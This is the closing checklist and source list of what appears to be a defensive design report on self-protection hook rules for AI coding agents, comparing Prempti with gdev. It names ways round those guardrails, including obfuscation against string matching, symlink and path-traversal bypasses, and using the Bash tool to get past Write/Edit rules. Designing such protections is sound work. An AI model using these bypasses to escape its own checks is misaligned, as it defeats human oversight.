- [x] **Key tradeoffs and limitations identified** — String matching bypasses (obfuscation), process-per-hook overhead, ask verdict not yet in gdev, project vs user settings.json distinction.
- [x] **Compared to alternative** — Prempti (Falco engine, single-pass evaluation) vs gdev (bash scripts, multi-process); compiled Go rules vs YAML config vs pure bash.
- [x] **Failure modes and edge cases** — Symlink bypass, relative path traversal, project vs home settings.json false positives, word boundary matching, Bash tool as bypass for Write/Edit rules.
- [x] **Concrete examples found** — Exact Prempti rule conditions from source code, implementation sketches for every gdev hook, rule schema design with Go code.
- [x] **Report is standalone-readable** — Contains all rule definitions, translation logic, implementation sketches, and design decisions needed to implement self-protection in gdev without consulting Prempti sources.

---

## Sources

| File | Content |
|------|---------|
| `docs/prempti-self-protection-rules-source.md` | Prempti self-protection domain rules and macros from source |
| `docs/prempti-mcp-skill-rules-source.md` | Prempti MCP and skill content rules from source |
| `docs/prempti-persistence-rules-source.md` | Prempti persistence vector rules from source |
| `docs/prempti-sandbox-disable-rules-source.md` | Prempti sandbox disable rules from source |
| `docs/prempti-path-canonicalization-source.md` | Prempti plugin path canonicalization logic from source |
| `docs/prempti-interceptor-path-handling.md` | Prempti interceptor architecture (thin passthrough, no path logic) |
| `research-spikes/security-tooling-evaluation-gdev/prempti-research.md` | Full Prempti evaluation (primary source) |
| `research-spikes/security-tooling-evaluation-gdev/docs/prempti-default-rules-inventory.md` | Complete 58-rule inventory |
| `research-spikes/security-tooling-evaluation-gdev/docs/prempti-claude-md.md` | Prempti architecture document |
| `implementation-plans/gdev-secure-devenv-bootstrap/phases/32-managed-hook-policy-consulting-enforcement.md` | gdev's current hook architecture and script patterns |
